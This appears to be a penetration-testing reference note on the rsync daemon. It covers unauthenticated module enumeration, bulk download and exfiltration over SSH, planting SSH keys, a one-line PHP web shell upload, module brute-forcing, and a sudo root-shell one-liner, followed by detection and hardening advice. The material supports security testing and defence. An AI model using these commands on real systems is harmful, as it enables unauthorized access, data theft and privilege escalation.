# Rsync

#Rsync #RemoteSync #filetransfer

## What is Rsync?

Fast, efficient file transfer/sync using delta transfer (only changed bytes). Runs two ways: over its **own daemon protocol** (TCP 873) or tunnelled over **SSH**. On an engagement the daemon is the target — modules are frequently exposed **unauthenticated**, so you can list, download, and often *upload* files with no credentials, turning a backup service into arbitrary file read/write.

- Port **TCP 873** — rsync daemon (unauthenticated by default unless `auth users` is set)
- Also tunnels over SSH (no dedicated port) — the common exfil path once you hold creds
- Config: `/etc/rsyncd.conf` (modules, paths, auth), `/etc/rsyncd.secrets` (`user:pass` pairs)

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/File Transfer/rsync\|rsync]] | The native client — enumerate modules, download/upload, SSH exfil |
| [[Tools/Scanning/NMAP\|NMAP]] | `rsync-list-modules` NSE + version/banner |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `rsync/modules_list`, `rsync/rsync_login` (auth brute) |

---

## Enumeration

```bash
# Nmap
nmap -p 873 --script rsync-list-modules -sV <target>

# List modules (unauthenticated) and their contents
rsync rsync://<target>/
rsync -av --list-only rsync://<target>/<module>/

# Banner grab
nc -nv <target> 873          # "@RSYNCD: <version>"
```

Read the banner version and whether a module prompts for a password (`auth users` set) vs. lists straight away (open).

---

## Connect / Access

```bash
# Download a whole module (unauth) / with auth
rsync -av rsync://<target>/<module>/ ./local_copy/
rsync -av rsync://<user>@<target>/<module>/ ./local_copy/

# Single file / upload
rsync rsync://<target>/<module>/path/to/file .
rsync -av ./local_file rsync://<target>/<module>/

# Over SSH (bulk exfil, resumable)
rsync -av -e "ssh -p 22" user@<target>:/remote/path ./local/
rsync -av -e "ssh -i ~/.ssh/id_rsa" ./local/ user@<target>:/remote/path/
```

---

## Attack Vectors

### Dump sensitive files

```bash
rsync -av rsync://<target>/<module>/ ./dump/
find ./dump \( -name "*.key" -o -name "authorized_keys" -o -name "*.conf" -o -name ".env" \)
```

### Upload SSH key (writable module → home dir)

```bash
rsync rsync://<target>/<module>/.ssh/authorized_keys .   # existing keys, if any
cat ~/.ssh/id_rsa.pub >> authorized_keys
rsync ./authorized_keys rsync://<target>/<module>/.ssh/
ssh user@<target>
```

### Upload web shell (module → web root)

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
rsync shell.php rsync://<target>/<module>/shell.php
# http://<target>/shell.php?cmd=id
```

> [!tip] **Check who the daemon writes as.** `rsyncd.conf` sets `uid`/`gid` per module (default `nobody`). If a module runs `uid = root` (or maps to a root-owned path a cron/script executes), an anonymous upload lands **as root** — chain it into a writable cron dir or a root-run script for privesc, not just a webshell.

### Brute-force authenticated modules

```bash
use auxiliary/scanner/rsync/modules_list
use auxiliary/scanner/rsync/rsync_login
# secrets live in /etc/rsyncd.secrets (user:pass) — grab it if you get file read
```

> [!note] **Local privesc angle.** The `rsync` binary is a GTFOBins entry: `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` gives a root shell if the user can run it via sudo. See [[Tools/File Transfer/rsync|rsync]].

---

## Detection & Artefacts

- **Unauthenticated module listing/transfer** shows in the rsync daemon log (`/var/log/rsyncd.log` or syslog) with the client IP and module — a pull of an entire module from an external host is the tell.
- **Uploaded webshell/SSH key** is a new file in the module path owned by the daemon `uid`; correlate an anonymous `rsync` write with a following web/SSH auth event.
- **`rsync_login` brute** = repeated auth failures against a module in the daemon log.
- Defensive baseline: set `auth users`+`secrets file` (chmod 600), `read only = yes` unless a module must accept uploads, restrict `hosts allow`, and never run modules as `uid = root`.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No `auth users` on a module | Unauthenticated read (and write if not read-only) |
| `read only = false` | Anonymous file upload → SSH key / webshell / cron |
| `hosts allow` unset / `*` | No network restriction |
| Module maps to `/` or a home dir | Full filesystem read/write |
| Module maps to web root | Webshell upload → RCE |
| `uid = root` on a writable module | Uploaded files land as root → privesc |
| `rsyncd.secrets` world-readable | Credential exposure |

---

## Quick Reference

| Goal | Command |
|---|---|
| List modules | `rsync rsync://host/` |
| List module contents | `rsync -av --list-only rsync://host/module/` |
| Download module | `rsync -av rsync://host/module/ ./local/` |
| Upload file | `rsync ./file rsync://host/module/` |
| Rsync over SSH | `rsync -av -e ssh user@host:/remote/ ./local/` |
| Nmap enum | `nmap -p 873 --script rsync-list-modules host` |
| sudo GTFOBins root | `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` |

---

> [!note] **See also** — the client's full flag/GTFOBins reference in [[Tools/File Transfer/rsync|rsync]]; file-share siblings [[Services/File Xfer/NFS|NFS]], [[Services/File Xfer/SMB|SMB]] and [[Services/File Xfer/SFTP|SFTP]]; exfil over SSH context in [[Services/Remote Access/SSH|SSH]].

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
